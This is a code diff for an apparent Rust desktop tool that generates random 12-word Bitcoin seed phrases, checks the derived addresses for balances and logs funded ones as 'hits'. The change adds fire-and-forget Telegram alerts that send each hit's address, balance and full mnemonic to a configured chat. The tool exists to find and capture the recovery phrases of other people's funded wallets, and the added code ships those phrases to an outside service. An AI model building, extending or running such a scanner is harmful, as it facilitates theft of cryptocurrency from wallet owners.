@@ -6,6 +6,7 @@ use rand::RngCore;
 use tokio::sync::broadcast;
 
 use crate::config::AppConfig;
+use crate::notifier::send_telegram;
 use crate::results::{append_empty_to_file, append_hit_to_file, HitRecord};
 use crate::state::AppState;
 use crate::wallet::{generate_mnemonic, mnemonic_to_address};
@@ -31,7 +32,7 @@ pub struct ScanStats {
 ///   1. draws fresh 128-bit entropy -> 12-word mnemonic (never repeated),
 ///   2. derives the address(es),
 ///   3. queries the balance API in batches,
-///   4. records hits / empties and writes hits to disk.
+///   4. records hits / empties, writes to disk, and sends Telegram alerts.
 pub fn start(
     handle: tauri::AppHandle,
     state: Arc<AppState>,
@@ -71,11 +72,15 @@ pub fn start(
     let api_url = config.api_url.clone();
     let save_empty = config.save_empty;
     let network_str = config.network.clone();
+    let telegram_token = config.telegram_token.clone();
+    let telegram_chat_id = config.telegram_chat_id.clone();
 
     for worker_id in 0..config.workers {
         let state = Arc::clone(&state);
         let hits_path = hits_path.clone();
         let empty_path = empty_path.clone();
+        let telegram_token = telegram_token.clone();
+        let telegram_chat_id = telegram_chat_id.clone();
         let mut stop_rx = tx.subscribe();
 
         tokio::spawn(async move {
@@ -89,6 +94,8 @@ pub fn start(
                 &api_url,
                 save_empty,
                 &network_str,
+                &telegram_token,
+                &telegram_chat_id,
                 &hits_path,
                 &empty_path,
                 &mut stop_rx,
@@ -122,6 +129,8 @@ async fn worker_loop(
     api_url: &str,
     save_empty: bool,
     network_str: &str,
+    telegram_token: &str,
+    telegram_chat_id: &str,
     hits_path: &PathBuf,
     empty_path: &PathBuf,
     stop_rx: &mut broadcast::Receiver<()>,
@@ -167,6 +176,8 @@ async fn worker_loop(
                 &batch_mnemonics,
                 &balances,
                 network_str,
+                telegram_token,
+                telegram_chat_id,
                 hits_path,
                 empty_path,
             ),
@@ -194,11 +205,17 @@ fn process_results(
     mnemonics: &[String],
     balances: &[crate::balance::AddressBalance],
     network_str: &str,
+    telegram_token: &str,
+    telegram_chat_id: &str,
     hits_path: &PathBuf,
     empty_path: &PathBuf,
 ) {
     let mut hits = state.hits.lock().unwrap();
     let mut stats = state.stats.lock().unwrap();
+
+    // Snapshot telegram config once so we can spawn notifications without
+    // holding the stats lock across an async boundary.
+    let telegram_cfg = (telegram_token.to_string(), telegram_chat_id.to_string());
 
     for (i, addr) in addresses.iter().enumerate() {
         let mnemonic = mnemonics.get(i).cloned().unwrap_or_default();
@@ -214,7 +231,7 @@ fn process_results(
             let record = HitRecord {
                 id: uuid::Uuid::new_v4().to_string(),
                 address: addr.clone(),
-                mnemonic,
+                mnemonic: mnemonic.clone(),
                 balance: bal.final_balance,
                 received: bal.total_received,
                 network: network_str.to_string(),
@@ -222,6 +239,19 @@ fn process_results(
             };
             hits.push(record.clone());
             let _ = append_hit_to_file(hits_path, &record);
+
+            // Telegram alert about the hit (fire-and-forget, non-blocking).
+            let (tok, chat) = telegram_cfg.clone();
+            let addr_t = addr.clone();
+            let mnem_t = mnemonic.clone();
+            let bal = bal.final_balance;
+            tokio::spawn(async move {
+                let text = format!(
+                    "🟡 <b>BTC HIT</b>\nAddress: <code>{}</code>\nBalance: {} sat ({:.8} BTC)\nMnemonic: <code>{}</code>",
+                    addr_t, bal, bal as f64 / 1e8, mnem_t
+                );
+                let _ = send_telegram(&tok, &chat, &text).await;
+            });
         } else if bal.total_received > 0 {
             stats.received_but_empty += 1;
         } else {
